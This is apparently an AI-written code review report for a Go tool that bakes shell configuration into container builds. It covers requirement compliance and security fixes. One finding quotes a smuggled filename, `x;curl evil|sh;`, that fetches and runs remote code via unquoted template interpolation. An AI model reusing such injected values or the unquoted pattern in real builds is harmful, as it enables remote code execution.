# Code Review: Runtime home model and shell initialization

**Spec:** specs/003-runtime-home-shell-init/spec.md
**Branch:** 003-runtime-home-shell-init
**Date:** 2026-10-14
**Reviewer:** Claude (speckit.spex-gates.review-code + spex-deep-review)
**Gate Outcome:** PASS (after fix round 1)

## Compliance Summary

**Overall score: 100% (14 of 14 functional requirements, 6 of 6 success criteria)**

Every functional requirement and success criterion has implementation evidence. The deviations found during review were code-quality, security-hardening, and test-adequacy issues, not missing or incorrect requirements. All Critical and Important findings were fixed in the autonomous fix loop; `make verify` is green afterward.

### Functional requirements

| Req | Implementation | Status |
|-----|----------------|--------|
| FR-001 interactive shell loads baked config under overmount | `internal/build/sections.go` (zsh/bash/sh sections), `internal/plan/plan.go` relocation constants | Compliant |
| FR-002 no auto-source of workspace-home startup files | zsh ZDOTDIR in `/etc/zshenv`; bash launcher `--noprofile --norc --rcfile`; sh non-login launcher (`internal/shell/shell.go`) | Compliant (strengthened: sh fallback, SEC-2) |
| FR-003 environment defined outside the home | `RelocationPrefix=/opt/sandcast`, `/etc` targets | Compliant |
| FR-004 deterministic across rebuilds | sorted env/dotfiles/relocations/notices (`internal/plan/relocation.go`, `plan.go`) | Compliant |
| FR-005 capture proposes host allowlist, user confirms | `internal/capture/dotfiles.go` `ProposeDotfiles`, `match.go` | Compliant (skip reasons now surfaced, COR-1) |
| FR-006 manifest accepts explicit dotfile paths | `internal/manifest/manifest.go` `Dotfile`, `internal/pipeline/pipeline.go` `dotfileInputs` | Compliant |
| FR-007 every baked dotfile passes redaction | `resolveDotfiles` → `redact.Replace` before staging | Compliant |
| FR-008 nothing baked resolves under overmount | `checkOvermountGuard`, `resolveDotfiles` reject, `safeTargetRe` | Compliant (strengthened: single-source WorkDir, SEC-1) |
| FR-009 overmount-only tool treated as missing, re-provisioned | `internal/plan/plan.go` probe reclassification | Compliant |
| FR-010 report each relocation/re-provision | `RelocationNotice`, `p.Notices` | Compliant |
| FR-011 zsh+bash supported; other → minimal safe default | `ShellKind`, sh fallback launcher + notice | Compliant |
| FR-012 own project shell only via explicit capture | no workspace sourcing anywhere | Compliant |
| FR-013 no runtime seeding; documented escape hatch | not implemented (per clarification) | Compliant |
| FR-014 tests and documentation | unit + integration tests, docs/guides/CHANGELOG updated | Compliant |

### Success criteria

| SC | Status |
|----|--------|
| SC-001 curated shell active under overmount | Compliant |
| SC-002 workspace startup file executed zero times | Compliant (sh fallback gap closed, SEC-2) |
| SC-003 selected dotfiles readable by their tool | Compliant (injective staging fixed, PROD-2) |
| SC-004 nothing sandcast-managed under overmount | Compliant (single-source WorkDir + safe-target guard) |
| SC-005 byte-identical rebuilds | Compliant |
| SC-006 overmount-only tool re-provisioned | Compliant |

## Deep Review Report

**Rounds:** 1 (gate reached PASS after round 1)
**Invocation:** ship pipeline (smart oversight), autonomous fix loop

### Review agent summary

| Agent | Found | Fixed | Remaining | Status |
|-------|-------|-------|-----------|--------|
| Correctness | 2 | 2 | 0 | completed |
| Architecture & Idioms | 8 | 3 | 0 (5 Notable) | completed |
| Security | 3 | 3 | 0 | completed |
| Production Readiness | 2 | 2 | 0 | completed |
| Test Quality | 7 | 3 | 0 (4 Minor) | completed |
| CodeRabbit (external) | - | - | - | skipped (service unavailable: free CLI allowance, repo not org-connected) |
| Copilot (external) | - | - | - | skipped (CLI not installed) |
| Codex (external) | - | - | - | skipped (usage limit reached) |
| Test Suite (regression) | 0 | - | 0 | passed (make verify green) |

MVP: Architecture & Idioms (8 findings). Highest-impact single finding: Security SEC-1 (Critical).

### Severity tally (merged, deduplicated)

| Severity | Found | Fixed | Remaining |
|----------|-------|-------|-----------|
| Critical | 1 | 1 | 0 |
| Important | 8 | 8 | 0 |
| Minor | 7 | 1 | 6 (non-gating) |
| Notable | 5 | 0 | 5 (captured) |

### Critical and Important findings (all fixed)

**SEC-1 (Critical) — build-time command injection via dotfile relocation target.**
`internal/build/sections.go` interpolated the relocation target unquoted into `RUN chmod 0644 {{.Target}}`. For the generic mapping the target derives from the manifest dotfile path, and manifest validation only blocked control characters, so a project-relative dotfile path with shell metacharacters (e.g. a committed file named `x;curl evil|sh;`) injected a command into the pass-1 build.
Fix: `internal/plan/relocation.go` now validates every relocation target against `safeTargetRe` (`^(/[A-Za-z0-9._-]+)+$`) and skips an unsafe one with a notice before it ever reaches the plan; the dotfiles template additionally quotes the target with the same `dirArg` helper the directory instructions use (defense in depth). New test: `TestResolveDotfilesSkipsUnsafeTarget`.

**SEC-2 (Important) — sh fallback auto-sourced the workspace `~/.profile`.**
The non-zsh/non-bash fallback used `CMD ["/bin/sh","-l"]` and `/bin/sh` as the login shell; a POSIX login shell reads `$HOME/.profile`, and `$HOME` is the overmounted workspace, so a workspace `.profile` would execute (violating FR-002/SC-002).
Fix: added `shell.ShLoginLauncher` and `plan.ShLoginPath`; the sh case now bakes a launcher that sets `$ENV` to the baked profile and execs a non-login `/bin/sh`, so no workspace startup file is read. `loginShell`, `cmdFor`, the sh template, and `bakedPaths` updated. Tests `TestLoginShell`, `TestShellSectionMinimalDefault` updated; `TestNoGeneratedFileSourcesTheHome` now passes for the sh kind too.

**SEC-3 / COR-2 (Important) — project-relative dotfiles not confined to the project root.**
`dotfileInputs` only applied symlink-escape containment to home-relative paths; a project-relative symlink (or `../` path) could read and bake a host file from outside the project.
Fix: `internal/pipeline/pipeline.go` now confines project-relative dotfiles to `env.Layout.Root` and home-relative ones to `env.Home`, skipping an escape with a notice (matching the skill-copy rule). The `homeRel` composite was simplified. New tests in `internal/pipeline/dotfiles_test.go`.

**ARCH-1 (Important) — dead return value.** `dedupDotfiles` returned an unused `loser` kept alive by `_ = loser`. Now returns a single value.

**ARCH-2 (Important) — `/sandbox` defined twice.** `build.WorkDir` and `plan.OvermountHome` were independent literals; a divergence would make the overmount guard validate against a different path than the WORKDIR, weakening SC-004. `build.WorkDir` is now `= plan.OvermountHome` (single source of truth).

**PROD-1 (Important) — dotfiles context dir not a reserved build entry.** The `dotfiles/` staging directory was a bare literal absent from `fsutil.buildEntries`, so the symlink-entry guard and the `allowed_domains_file` reserved-name refusal did not cover it. Added `build.DotfileContextDir`, registered it in `fsutil.buildEntries`, and extended `TestBuildEntriesMatchBuildConstants`.

**PROD-2 (Important, elevated from Minor) — non-injective staging filename.** `DotfileContextFile` collapsed `/` and `_`, so two distinct targets could stage to the same context file and silently bake one dotfile's content into another's destination. The encoding now doubles `_` before mapping `/` to `_` (injective).

**TEST-1 (Important) — `dotfileInputs` untested.** Added `internal/pipeline/dotfiles_test.go` covering allowlist vs explicit tagging, missing path, unresolved home, home-symlink escape, project-symlink escape, and project-relative-inside success.

**TEST-2 (Important) — misleading guard test.** `TestResolveDotfilesRejectsOvermountTarget` asserted `NoError` and never exercised the guard. It now passes an overlapping overmount prefix so the real error path is covered.

### Additional fix beyond the gate

**COR-1 (Minor) — discarded skip notices.** `match.go` dropped `ProposeDotfiles`' skip reasons. Added `Result.DotfileNotices`, wired it through `match.go`, and rendered it in the `components match` CLI output.

**ARCH-8 (Notable) — `bakedPaths` completeness.** The bash case now lists `BashRCPath` unconditionally (it is always baked), keeping the guard list faithful to its contract.

### Remaining findings (non-gating)

Minor (6): reprovisionTarget branch coverage (mise/fragment), FR-011 plan-notice assertion, SC-002 behavioral proof is integration-only (unit proxy strengthened this round), `ProposeDotfiles` skip-branch coverage, `RelocationNotice.String()` text assertion.

Notable (5, captured for future work): consolidate the duplicated `within`/`withinDir` containment helpers; factor the three first-wins env merges; `RCPath`/`RCPath0` naming models one file as two fields; the container target emits overmount "relocated" notices though it has no overmount; `RelocationNotice.To` for a re-provision is a best-effort string that may not match the installer's actual path.

### Verification

`make verify` (all unit packages + golangci-lint): PASS, 0 lint issues. Fixes touched 13 files (+165/-48). No spec requirement was dropped during the fix loop (post-fix coverage: 14/14 FR verified).
